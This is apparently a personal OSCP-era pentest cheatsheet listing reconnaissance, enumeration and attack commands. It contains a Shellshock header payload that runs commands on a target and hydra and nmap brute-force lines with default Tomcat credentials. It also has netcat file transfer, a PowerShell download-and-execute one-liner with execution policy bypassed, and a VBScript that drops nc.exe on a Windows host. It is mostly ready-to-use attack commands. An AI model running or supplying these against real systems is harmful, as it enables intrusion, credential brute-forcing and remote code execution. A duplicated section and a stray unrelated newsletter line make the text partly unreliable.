# My pentest cheatsheet 
This is my pentest cheatsheet I made during OSCP journey :)
   
   
## Information Gathering

The first step we should always take is 'Information Gathering' about the target.   
Initial fingerprinting is mainly done using 'nmap'.

#### TCP Ports : nmap options that fingerprinting OS, Services, Ports information
```bash
sudo nmap -A --privileged -sS <IP>
```

### UDP Ports : nmap options scanning UDP ports
```bash
sudo nmap -A --privileged -sU <IP>
```

#### All Ports : nmap options that scanning all opened ports (By default, nmap does not scan all ports)
```bash
sudo nmap -p0-65535 -sS -sU -v <IP>
```

#### Public Exploits Scanning : Additional script installation required
```bash
# Install : 
git clone https://github.com/scipag/vulscan
ln -s `pwd`/vulscan /usr/share/nmap/scripts/vulscan

# Execute :     
nmap -sV --script=vulscan/vulscan.nse <IP>
```

<hr/>

#### SMB Enumeration : smb-enum-users, smb-enum-shares, smb-enum-processes, smb-enum-groups, smb-enum-domains
```bash
sudo nmap --script "smb-enum-* and not(smb-enum-services)" -p 139,445 <IP>
```

#### SMB Fingerprinting
```bash
sudo nmap --script smb-os-discovery -p 139,p445 <IP>
```

#### SMB Vulnerability tests
```bash
sudo nmap -sS --script "smb-vuln-* and not(smb-vuln-regsvc-dos)" \
--script-args smb-vuln-cve-2017-7494.check-version,unsafe=1 -p139,445 <IP>
```
<hr/>

#### HTTP Shellshock : CVE-2014-6271, CVE-2014-7169
```bash
sudo nmap -sV -p- --script http-shellshock --script-args uri=/cgi-bin/bin,cmd=whoami <IP>
```
```bash
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'uname;id'" <URL>/cgi-bin/<SCRIPT>
```
<hr/>

#### FTP backdoor : ProFTPD 1.3.3c, vsFTPd 2.3.4
```bash
sudo nmap --script "ftp-proftpd-backdoor and ftp-vuln-cve2010-4221 and ftp-proftpd-backdoor" -p 21 --script-args cmd=whoami <IP>
```
<hr/>

#### FTP backdoor : ProFTPD 1.3.3c, vsFTPd 2.3.4
```bash
sudo nmap --script "ftp-proftpd-backdoor and ftp-vuln-cve2010-4221 and ftp-proftpd-backdoor" -p 21 --script-args cmd=whoami <IP>
```
<hr/>

#### SMTP Enumeration Users
```bash
sudo nmap --script smtp-enum-users.nse smtp-enum-users.methods={EXPN,RCPT,VRFY} -p 25,465,587 <IP>
```
```bash
smtp-user-enum -U /usr/share/wordlists/metasploit/namelist.txt -w 60 -v -d -t <IP>
```
<hr/>

#### SNMP Win32 Enumeration Users
```bash
sudo nmap -sU -p 161 --script=snmp-win32-users <IP>
```
<hr/>

#### dirb : HTTP Directory Bruteforcing
```bash
dirb -r -z 10 http://<URL>
```

#### dirb : HTTP Directory Bruteforing with file extensions
```bash
dirb -r -z 10 -X .jsp,.html,.cgi http://<URL>
```

#### nikto : /cgi-bin finder
```bash
nikto -host http://<URL>
```
#### wpscan : Wordpress Public Exploits Scanner
```bash
wpscan --enumerate ap,at,cb,dbe --url http://<URL>
```
<hr/>
   
   
## Default Credentials / Bruteforcing 

#### Apache Tomcat default Credentials
```
admin:admin
tomcat:tomcat
admin:<NOTHING>
admin:s3cr3t
tomcat:s3cr3t
admin:tomcat
```

#### HTTP Apache BasicAuth Bruteforce
```bash
hydra -l Administrator -V -P /usr/share/wordlists/metasploit/password.lst -t 15 -s <PORT> -f <IP> http-get <PATH>
```
<hr/>

#### FTP Anonymous Login Check / Bruteforce
```bash
sudo nmap -sV -sC --script "ftp-anon and ftp-brute" -p 21 <IP>
```
<hr/>

#### MYSQL Anonymous Login Check / BruteForce
```bash
sudo nmap -sV --script "mysql-enum and mysql-empty-password and mysql-brute" -p 3306 <IP>
```
<hr/>

#### RealVNC Authentication Bypass Check
```bash
sudo nmap -sV --script=realvnc-auth-bypass <IP>
```
<hr/>

#### SMB Anonymous Login Check
```bash
rpcclient -U "" -N <IP>
```
```bash
crackmapexec smb <IP> -u '' -p '' --shares
```
```bash
smbclient \\\\<IP>\\<PATH>
```
<hr/>
   
   
##File Transfer

#### Linux
```bash
# Python 2.7 Start HTTP Server 
python -m SimpleHTTPServer 80

# Python 3 Start HTTP Server
python3 -m http.server 80

# Python FTP Server
sudo python -m pyftpdlib  -p 21 -w

# TFTP Server
sudo apt-get install tftpd-hpa
sudo service tftpd-hpa start
```

```bash
wget <URL>
```
```bash
curl <URL> -o <OUT_PATH>
```
```bash
# Receiver
nc -l -v -p 5651 > <OUT_PATH>

# Sender
nc <IP> 5651 < <IN_PATH>
```
<hr/>

#### Windows
```bash
# Download from Tftp Server
tftp -i <IP> get <PATH>
# Upload to TFtp Server
tftp -i <IP> put <PATH>
```

```bash
# Download and Unzip
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<IP>/kerbers.zip', '.\kerbers.zip')
powershell -command "Expand-Archive -Force 'c:\windows\temp\kerbers.zip' '.\'" 
```

```bash
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<IP>/Sherlock.ps1', '.\Sherlock.ps1')
powershell -exec bypass -command "& { Import-Module .\Sherlock.ps1;Find-AllVulns;$log=Get-Results;$log>.\dual5651.log}"
```

```bash
# Download and Execute Powershell Script
powershell -nop -ep bypass -c "iex (New-Object Net.WebClient).DownloadString('http://<IP>/Remove-Update.ps1');Remove-Update Security"
```

```html
# vbscript.vbs
type vbscript.vbs
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", "https://github.com/make0day/pentest_binary/raw/main/nc.exe", False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile "C:\windows\temp\nc.exe", 2
end with

CSCRIPT.EXE vbscript.vbs
```
<hr/>

```
CGO_ENABLED=0 go get -u github.com/liamg/traitor/cmd/traitor
```

- 0/06/21: [Console 58](https://console.substack.com/p/console-58) - Awesome newsletter featuring tools and beta releases for developers.
